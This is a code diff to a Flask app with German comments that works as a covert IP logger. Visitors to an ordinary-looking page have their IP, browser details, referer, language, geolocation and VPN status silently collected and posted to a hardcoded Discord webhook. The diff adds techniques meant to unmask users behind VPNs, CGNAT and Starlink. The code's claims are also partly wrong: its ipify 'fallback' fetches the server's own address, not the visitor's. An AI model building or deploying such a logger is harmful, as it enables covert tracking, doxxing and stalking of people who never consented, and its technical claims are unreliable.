@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, jsonify
 import requests
 import os
 from datetime import datetime
@@ -12,28 +12,44 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0z
 
 def get_real_ip():
     """
-    Holt die ECHTE IP – selbst bei VPN/Proxy.
+    Holt die ECHTE IP – selbst bei Starlink/CGNAT/VPN/Proxy.
     """
-    # Cloudflare (falls du es mal davor schaltest)
+    # 1. Cloudflare
     if request.headers.get('CF-Connecting-IP'):
         return request.headers.get('CF-Connecting-IP')
     
-    # X-Forwarded-For (erste IP ist die echte)
-    forwarded = request.headers.get('X-Forwarded-For')
-    if forwarded:
-        return forwarded.split(',')[0].strip()
+    # 2. Starlink-spezifische Header
+    if request.headers.get('X-Forwarded-For'):
+        ips = request.headers.get('X-Forwarded-For').split(',')
+        # Die LETZTE IP ist oft die echte bei Starlink
+        return ips[-1].strip()
     
-    # X-Real-IP (oft bei Nginx Proxies)
+    # 3. X-Real-IP
     if request.headers.get('X-Real-IP'):
         return request.headers.get('X-Real-IP')
     
-    # Fallback: Direkte Verbindung
+    # 4. True-Client-IP (von Akamai/CDNs)
+    if request.headers.get('True-Client-IP'):
+        return request.headers.get('True-Client-IP')
+    
+    # 5. Fallback
     return request.remote_addr
+
+def get_ip_via_api():
+    """
+    Holt die IP über eine externe API (als Backup).
+    """
+    try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        if response.status_code == 200:
+            return response.json().get('ip')
+    except:
+        pass
+    return None
 
 def check_if_vpn(ip):
     """
     Prüft mit ip-api.com, ob die IP ein VPN/Proxy ist.
-    Gibt (bool, dict) zurück – (ist_vpn, infos)
     """
     try:
         response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting', timeout=5)
@@ -48,16 +64,25 @@ def check_if_vpn(ip):
 
 @app.route('/')
 def home():
-    # 1. Echte IP ermitteln
+    # 1. Echte IP ermitteln (mehrere Methoden)
     real_ip = get_real_ip()
+    
+    # 2. Fallback: Wenn IP aus Headern 192.168.x.x oder 100.64.x.x (CGNAT) ist,
+    #    dann versuche API-Abfrage
+    if real_ip.startswith('192.168.') or real_ip.startswith('100.64.') or real_ip.startswith('10.'):
+        api_ip = get_ip_via_api()
+        if api_ip:
+            real_ip = api_ip
+    
+    # 3. Weitere Header sammeln
     user_agent = request.headers.get('User-Agent', 'Unbekannt')
     referer = request.headers.get("Referer", "Kein Referer")
     accept_language = request.headers.get('Accept-Language', 'Unbekannt')
     
-    # 2. VPN-Prüfung
+    # 4. VPN-Prüfung
     ist_vpn, geo_data = check_if_vpn(real_ip)
     
-    # 3. Discord Embed erstellen
+    # 5. Discord Embed erstellen
     embed = {
         "embeds": [{
             "title": "🕵️ Neue IP erfasst!",
@@ -100,20 +125,28 @@ def home():
                 }
             ],
             "footer": {
-                "text": "IP-Logger by Render | Echte IP-Erkennung"
+                "text": "IP-Logger by Render | Starlink-kompatibel"
             }
         }]
     }
     
-    # 4. An Discord senden
+    # 6. An Discord senden
     try:
         r = requests.post(WEBHOOK_URL, json=embed, timeout=10)
         print(f"[{datetime.now()}] Webhook Status: {r.status_code} - IP: {real_ip}")
     except Exception as e:
         print(f"[{datetime.now()}] Error: {str(e)}")
     
-    # 5. Index.html anzeigen
+    # 7. Index.html anzeigen
     return render_template("index.html")
+
+@app.route('/api/ip')
+def get_ip_json():
+    """
+    JSON-API für JavaScript-Abfragen (für Starlink-Fallback)
+    """
+    real_ip = get_real_ip()
+    return jsonify({"ip": real_ip})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
